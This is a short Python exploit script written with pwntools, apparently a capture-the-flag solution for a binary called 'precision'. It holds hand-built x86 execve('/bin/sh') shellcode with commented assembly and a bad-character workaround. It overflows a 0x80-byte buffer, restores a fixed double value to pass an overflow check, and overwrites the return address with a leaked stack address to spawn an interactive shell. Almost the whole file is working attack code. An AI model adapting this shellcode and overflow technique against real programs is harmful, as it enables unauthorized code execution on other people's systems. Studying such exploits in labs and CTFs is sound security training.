#filename:exp.py
#author:reshahar
from pwn import *
import binascii

p = process('./precision_a8f6f0590c177948fe06c76a1831e650')

#execve('/bin/sh')

# xor ecx,ecx
# push ecx
# push 0x68732f2f ;; hs//
# push 0x6e69622f ;; nib/
# mov ebx,esp
# mov al,15
# sub eax,4     "\x0b" bad char
# int 0x80

shell="\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0f\x83\xe8\x04\xcd\x80" 

p.recvuntil('Buff: ')
jmp = p.recv(10)
jmp = int(jmp,16)

print 'jmp addr'+p32(jmp)

double = 'a5315a4755155040'

#playload = 'A'*0x80+binascii.a2b_hex(double)+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

# f = open('1','wb')
# f.write(playload)


playload = shell+'A'*(0x80-len(shell))+binascii.a2b_hex(double)+'C'*12+p32(jmp)


p.sendline(playload)

p.interactive()
